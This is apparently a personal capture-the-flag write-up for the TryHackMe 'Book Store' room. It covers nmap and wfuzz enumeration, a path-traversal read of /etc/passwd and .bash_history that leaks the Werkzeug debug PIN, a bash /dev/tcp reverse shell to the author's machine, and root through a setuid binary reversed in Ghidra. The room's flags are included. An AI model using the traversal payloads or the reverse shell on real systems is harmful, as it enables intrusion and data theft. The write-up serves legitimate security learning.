# Tryhackme.com Room : Book Store
`https://tryhackme.com/room/bookstoreoc`


# Instance
```
export IP=10.10.145.189
```

# Nmap
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 5000 we get :
```
Foxy REST API v2.0

This is a REST API for science fiction novels.
```

Robots.txt contains:
```
User-agent: *

Disallow: /api 
```

We get the API doc on `:5000/api`:
```
API Documentation
Since every good API has a documentation we have one as well!
The various routes this API currently provides are:

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

Seems like the `:5000` server is a python server

Let's take a look at port `80`

Login & signup doesn't seem to do anything.

On the book page we find this encoded string :
```
GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS===
```

Which is `base32 -> Hex -> Ascii`. We get a youtube video `https://www.youtube.com/watch?v=Tt7bzxurJ1I` trollllll

There is some javascript that call the `/api/v2/resources/books/random4` endpoint.

I guess we need to fuzz the api to find hidden endpoints.

We used `wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 404 http://$IP:5000/FUZZ`

To find the endpoint `/console` which is a python console protected by a "pin".

The pin does a 
```
{
	"__debugger__":"yes",
	"cmd":"pinauth",
	"pin":"44",
	"s":"vXhr907ElFrxmueAlAsl"
}
```

Looking at the code of the page, we see
```
We need to make sure this has a favicon so that the debugger does
not by accident trigger a request to /favicon.ico which might
change the application state
```

Hmmm, interesting, maybe this is used to bypass the trial threshold ? [THIS IS NOTHING, It's in the cloned code..ignore]

Ressources are loaded as :
```
"?__debugger__=yes&amp;cmd=resource&amp;f=console.png"
<script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
```

```
var TRACEBACK = -1,
CONSOLE_MODE = true,
EVALEX = true,
EVALEX_TRUSTED = false,
SECRET = "vXhr907ElFrxmueAlAsl";
```

I tried simply breaking into the js code and changing the auth value too see if the checks were client side but then my commands would return `404`
```
:5000/console?__debugger__=yes&cmd=print(%22Test%22)&frm=0&s=vXhr907ElFrxmueAlAsl
```

```
:5000/console?__debugger__=yes&cmd=pinauth&pin=44&s=vXhr907ElFrxmueAlAsl
```

Sooo, looking around, it seems like we can reverse the pin generation but we need some secrets. See https://ctftime.org/writeup/17955, https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug

We need a file inclusion exploit to retrieve those.

When we query the books, we get the first line of the book. This is probably read from file. We got to find a way to abuse the api.

Hmmm been toying around with the `books` endpoint but couldn't get anything interesting..

Neither with the `"?__debugger__=yes&amp;cmd=resource&amp;f=FILE"` requests... Seems like we can only get files in the current folder..
Well `../` doesn't seem to work

At this point, i'm kinda lost, can't find the local file inclusion vuln.. there is a big chance that the file inclusion is in the `books` endpoint but can't figure it out..

Trying to fuzz the get parameter to see if there is some hidden parameter...

Soo this was the way to go, but, im so stupid, didn't really check if there was a `/v1` api and indeed there is one.

fuzzing the parameters again with `wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP:5000/api/v1/resources/books?FUZZ=1`
We find the parameter
```
show
```

Which is a direct file inclusion. We can dump `/etc/passwd` with 
`http://$IP:5000/api/v1/resources/books?show=../../../etc/passwd`
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sid:x:1000:1000:Sid,,,:/home/sid:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

The user name that we need is probably `sid`

To recenter on what we need :
```
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```

```
username = sid
modname = flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')) = Flask
```

To get the absolute path, we can trigger an error with 
`http://$IP:5000/api/v1/resources/books?show=whatever`

From the error, we can validate that the user is `sid` :
```
File "/home/sid/api.py"
```

And the `app.py` seems to be there :
```
/usr/lib/python3/dist-packages/flask/app.py
```

Then we need the machine id. We can find it in `/etc/machine-id`
`http://$IP:5000/api/v1/resources/books?show=../../../etc/machine-id`
```
d86a656616e9492d93f4ab7905f44292
```

Then we need the interface MAC address.
We can leak the interfaces bu reading `/proc/net/ark`
`:5000/api/v1/resources/books?show=../../../proc/net/arp`

```
IP address       HW type     Flags       HW address            Mask     Device
10.10.0.1        0x1         0x2         02:c8:85:b5:5a:aa     *        eth0
```

Then we get the mac from `/sys/class/net/eth0/address`
`:5000/api/v1/resources/books?show=../../../sys/class/net/eth0/address`
```
02:6b:3c:e6:3c:19
```


OMGGGG....after some time fiddling with generating some pins, i read a write up and... AGAIN... fuckin `.bash_history`
So yeah.. Dumping that with `:5000/api/v1/resources/books?show=.bash_history` we get 
```
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

So yeah... that was stupid. Thought it would have been cooler if we had to recreate the pin (I'm just salty because I did it for nothing :P)


Now i got a python console.

We get a reverse shell using
```
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.6.32.20/8888 0>&1'")
```

We got a shell as `sid`.
we get the `user.txt` flag:
```
4ea65eb80ed441adb68246ddf7b964ab
```

There is a setuid binary named `try-harder` in the home directory.

We retrieve the binary by spawning an http server `python3 -m http.server`.

I guess we can bruteforce the number ?

Tried that just for fun, left it to run in the background and poped up `Ghidra`.

There is no function ref in the binary so we start at `.text`.
We get to the main function and find the interesting code :
```c
  puts("What\'s The Magic Number?!");
  scanf(&input);
  input_xor = input ^ 0x1116 ^ 0x5db3;
  if (input_xor == 0x5dcd21f4) {
    system("/bin/bash -p");
  }
  else {
    puts("Incorrect Try Harder");
  }
```

By re xoring the output `0x5dcd21f4 ^ 0x1116 ^ 0x5db3`
We get:
```
1573743953
```

Which is the answer, we can now enter it on the server and get root.

Here is the root flag :
```
e29b05fba5b2a7e69c24a450893158e3
```

Again, a nice box.
	- Learned how to use `wfuzz`
	- learned more about `werkzeug` server and the console/pin vulnerability
		- Was nice to reverse engineer the pin generation
	- AGAIN !! Should have looked at `.bash_history` first !!
	- Stupid mistake not to look in `/api/v1`. I did look in the beginning but not on a valid endpoint..
	- Was cool to get ghidra out and retrieve the magic number from the code. Way more satisfying than bruteforcing it (Would have taken quite a while anyway)
	- Didn't know about `/proc/net/ark` to list interfaces